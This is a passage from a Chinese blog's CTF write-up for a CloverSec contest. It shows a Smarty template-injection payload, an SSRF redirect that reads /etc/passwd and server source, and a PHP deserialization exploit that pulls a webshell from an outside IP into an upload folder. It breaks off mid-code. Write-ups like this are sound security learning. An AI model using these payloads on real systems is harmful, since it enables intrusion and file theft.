@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>四叶草安全牛年CTF大赛 - Leon&#39;s Blog</title><meta name="Description" content="Leon&#39;s Blog-Keep learning web security"><meta property="og:title" content="四叶草安全牛年CTF大赛" />
+<meta property="og:description" content="寒假没怎么打CTF，后面的AntCTF、D^3CTF刚好在开学的时间段，四叶草安全举办的小比赛，都是简单题，随便看看" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://clq0.top/%E5%9B%9B%E5%8F%B6%E8%8D%89%E5%AE%89%E5%85%A8%E7%89%9B%E5%B9%B4ctf%E5%A4%A7%E8%B5%9B/" />
+<meta property="og:image" content="https://clq0.top/logo_.jpg"/>
+<meta property="article:published_time" content="2021-02-27T20:34:38+08:00" />
+<meta property="article:modified_time" content="2021-02-27T20:34:38+08:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://clq0.top/logo_.jpg"/>
+
+<meta name="twitter:title" content="四叶草安全牛年CTF大赛"/>
+<meta name="twitter:description" content="寒假没怎么打CTF，后面的AntCTF、D^3CTF刚好在开学的时间段，四叶草安全举办的小比赛，都是简单题，随便看看"/>
+<meta name="application-name" content="Leon&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Leon&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://clq0.top/%E5%9B%9B%E5%8F%B6%E8%8D%89%E5%AE%89%E5%85%A8%E7%89%9B%E5%B9%B4ctf%E5%A4%A7%E8%B5%9B/" /><link rel="prev" href="https://clq0.top/computer_organization_and_architecture/" /><link rel="next" href="https://clq0.top/ciscn2021_writeup/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "四叶草安全牛年CTF大赛",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/clq0.top\/%E5%9B%9B%E5%8F%B6%E8%8D%89%E5%AE%89%E5%85%A8%E7%89%9B%E5%B9%B4ctf%E5%A4%A7%E8%B5%9B\/"
+        },"genre": "posts","keywords": "SSRF, SQL注入, unserialize","wordcount":  1110 ,
+        "url": "https:\/\/clq0.top\/%E5%9B%9B%E5%8F%B6%E8%8D%89%E5%AE%89%E5%85%A8%E7%89%9B%E5%B9%B4ctf%E5%A4%A7%E8%B5%9B\/","datePublished": "2021-02-27T20:34:38+08:00","dateModified": "2021-02-27T20:34:38+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Leon","logo": "https:\/\/clq0.top\/logo_.jpg"},"author": {
+                "@type": "Person",
+                "name": "Leon"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Leon&#39;s Blog"><span class="header-title-pre">❤</span>Leon&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Leon&#39;s Blog"><span class="header-title-pre">❤</span>Leon&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">四叶草安全牛年CTF大赛</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="http://clq0.top" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>Leon</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeup/"><i class="far fa-folder fa-fw"></i>Writeup</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-02-27">2021-02-27</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1110 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;3 minutes&nbsp;<span id="/%E5%9B%9B%E5%8F%B6%E8%8D%89%E5%AE%89%E5%85%A8%E7%89%9B%E5%B9%B4ctf%E5%A4%A7%E8%B5%9B/" class="leancloud_visitors" data-flag-title="四叶草安全牛年CTF大赛">
+                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
+                    </span>&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#get">GET</a></li>
+    <li><a href="#website">Website</a></li>
+    <li><a href="#filemange">filemange</a></li>
+    <li><a href="#stack3d-1nj3c">StAck3d 1nj3c</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>寒假没怎么打CTF，后面的AntCTF、D^3CTF刚好在开学的时间段，四叶草安全举办的小比赛，都是简单题，随便看看</p>
+<h2 id="get">GET</h2>
+<p>smarty模板注入</p>
+<p>可以使用<code>{if phpinfo()}{/if}</code>执行任意php代码</p>
+<p>用header绕一下<code>flag</code>关键字就行</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20210225102444791.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210225102444791.png, https://gitee.com/leonsec/images/raw/master/image-20210225102444791.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210225102444791.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20210225102444791.png"
+        title="image-20210225102444791" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-http" data-lang="http"><span class="err">?flag={if%20show_source(array_rand(array_flip(getallheaders())))}{/if} 
+</span><span class="err">header:
+</span><span class="err">0: flag.php
+</span></code></pre></td></tr></table>
+</div>
+</div><h2 id="website">Website</h2>
+<p>给了一个提交url页面，测试发现是后端访问，猜测是php的curl</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20210225123109530.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210225123109530.png, https://gitee.com/leonsec/images/raw/master/image-20210225123109530.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210225123109530.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20210225123109530.png"
+        title="image-20210225123109530" /></p>
+<p>测试发现，只能以http或者https协议开头，尝试302重定向绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: file:///etc/passwd&#34;</span><span class="p">);</span>
+<span class="k">exit</span><span class="p">;</span>
+<span class="cp">?&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>读到<code>/etc/passwd</code></p>
+<p>尝试直接读flag，但是并没有什么发现</p>
+<p>通过<code>/proc/self/cwd/index.php</code>读到了源码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="k">function</span> <span class="nf">check_302</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_FOLLOWLOCATION</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> <span class="c1">// 302 redirect
+</span><span class="c1"></span>    <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+    <span class="nv">$info</span> <span class="o">=</span> <span class="nx">curl_getinfo</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+    <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nv">$info</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">];</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="s1">&#39;http://127.0.0.1/&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span> <span class="o">||</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="s1">&#39;http://localhost/&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">exit</span><span class="p">(</span><span class="s2">&#34;&lt;script&gt;alert(&#39;Cloversec WAF!&#39;)&lt;/script&gt;&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^(http|https):\/\/[_a-zA-Z0-9-]+(.[_a-zA-Z0-9-]+)*/i&#39;</span><span class="p">,</span> <span class="nv">$url</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">exit</span><span class="p">(</span><span class="s2">&#34;&lt;script&gt;alert(&#39;Cloversec WAF!&#39;)&lt;/script&gt;&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="nv">$url</span> <span class="o">=</span> <span class="nx">check_302</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="nv">$url</span><span class="p">;</span>
+    <span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="nv">$result</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+    <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+
+    <span class="k">echo</span> <span class="s2">&#34;&lt;div class=&#39;yulan&#39;&gt;&lt;head&gt; &lt;base href=&#39;&#34;</span> <span class="o">.</span> <span class="nv">$url</span> <span class="o">.</span> <span class="s2">&#34;/&#39;&gt;  &lt;/head&gt;&lt;!--  以下是正文     --&gt;&lt;br&gt;&#34;</span> <span class="o">.</span> <span class="nv">$result</span> <span class="o">.</span> <span class="s2">&#34;&lt;/div&gt;&#34;</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">&#34;&lt;div class=&#39;yulan&#39;&gt;&lt;h2&gt;Hello&lt;/h2&gt;&lt;/div&gt;&#34;</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>然后根据响应看到是<code>Server: Apache/2.2.15</code>，该版本的配置文件路径为：<code>/etc/httpd/conf/httpd.conf</code></p>
+<p>读到了：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-ini" data-lang="ini"><span class="na">&lt;VirtualHost _default_:80&gt;</span>
+<span class="na">DocumentRoot /var/www/html/web1</span>
+<span class="na">&lt;/VirtualHost&gt;</span>
+
+<span class="na">&lt;VirtualHost *:8080&gt;</span>
+    <span class="na">DocumentRoot /var/www/html/web2</span>
+<span class="na">&lt;/VirtualHost&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>读web2源码：</p>
+<p><code>/var/www/html/web2/index.php</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="k">class</span> <span class="nc">copy_file</span><span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$path</span> <span class="o">=</span> <span class="s1">&#39;upload/&#39;</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$url</span><span class="p">;</span>
+    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">url</span><span class="p">,</span><span class="s1">&#39;http://127.0.0.1&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">){</span>
+            <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">path</span><span class="o">.</span><span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">file</span><span class="p">,</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">url</span><span class="p">));</span>
+            <span class="k">echo</span> <span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">path</span><span class="o">.</span><span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">file</span><span class="o">.</span><span class="s2">&#34; update successed!)&lt;br&gt;&#34;</span><span class="p">;</span>
+        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+            <span class="k">echo</span> <span class="s2">&#34;Hello CTFer&#34;</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">])){</span>
+    <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">];</span>
+    <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">&#34;&lt;h2&gt;Welcome to CloverSec WebSite&lt;h2&gt;&#34;</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>简单构造一下，写个shell：</p>
+<p>这里试了直接web1路径，但是没权限，只有web2的<code>upload</code>目录可写</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="k">class</span> <span class="nc">copy_file</span><span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$path</span> <span class="o">=</span> <span class="s1">&#39;upload/&#39;</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$url</span><span class="p">;</span>
+    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
+		<span class="nx">var_dump</span><span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">url</span><span class="p">,</span><span class="s1">&#39;http://127.0.0.1&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">url</span><span class="p">,</span><span class="s1">&#39;http://127.0.0.1&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">){</span>
+            <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">path</span><span class="o">.</span><span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">file</span><span class="p">,</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">url</span><span class="p">));</span>
+            <span class="k">echo</span> <span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">path</span><span class="o">.</span><span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">file</span><span class="o">.</span><span class="s2">&#34; update successed!)&lt;br&gt;&#34;</span><span class="p">;</span>
+        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+            <span class="k">echo</span> <span class="s2">&#34;Hello CTFer&#34;</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">copy_file</span><span class="p">();</span>
+<span class="nv">$a</span><span class="o">-&gt;</span><span class="na">file</span> <span class="o">=</span> <span class="s1">&#39;a.php&#39;</span><span class="p">;</span>
+<span class="nv">$a</span><span class="o">-&gt;</span><span class="na">url</span> <span class="o">=</span> <span class="s1">&#39;http://127.0.0.1@47.102.210.191:8000/a.txt&#39;</span><span class="p">;</span>
+<span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
+<span class="cp">?&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>用<code>@</code>绕一下开头，a.txt内容为get的一句话，方便使用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: http://127.0.0.1:8080/?data=O%3A9%3A%22copy_file%22%3A3%3A%7Bs%3A4%3A%22path%22%3Bs%3A7%3A%22upload%2F%22%3Bs%3A4%3A%22file%22%3Bs%3A5%3A%22a.php%22%3Bs%3A3%3A%22url%22%3Bs%3A42%3A%22http%3A%2F%2F127.0.0.1%4047.102.210.191%3A8000%2Fa.txt%22%3B%7D&#34;</span><span class="p">);</span>
+<span class="k">exit</span><span class="p">;</span>
+<span class="cp">?&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20210225124806999.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210225124806999.png, https://gitee.com/leonsec/images/raw/master/image-20210225124806999.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210225124806999.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20210225124806999.png"
+        title="image-20210225124806999" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20210225124927459.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210225124927459.png, https://gitee.com/leonsec/images/raw/master/image-20210225124927459.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210225124927459.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20210225124927459.png"
+        title="image-20210225124927459" /></p>
+<p>shell弹不出来，看到web2路径才发现<code>flag_WebSite_SsRf.txt</code></p>
+<p>直接访问：http://4b7c0f6a.yunyansec.com/index.php?url=http://127.0.0.1:8080/flag_WebSite_SsRf.txt</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20210225125306041.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210225125306041.png, https://gitee.com/leonsec/images/raw/master/image-20210225125306041.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210225125306041.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20210225125306041.png"
+        title="image-20210225125306041" /></p>
+<p>flag{d195eeb026cadd7d00e79d112b102f00}</p>
+<h2 id="filemange">filemange</h2>
+<p>code.html给了源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="nv">$path</span> <span class="o">=</span> <span class="s2">&#34;./sandbox/&#34;</span><span class="p">;</span>
+<span class="k">class</span> <span class="nc">game</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$file_name</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$content</span> <span class="o">=</span> <span class="s2">&#34;Hello World&#34;</span><span class="p">;</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_name</span> <span class="o">=</span> <span class="nv">$file_name</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">,</span> <span class="s2">&#34;php&#34;</span><span class="p">))</span> <span class="p">{</span>
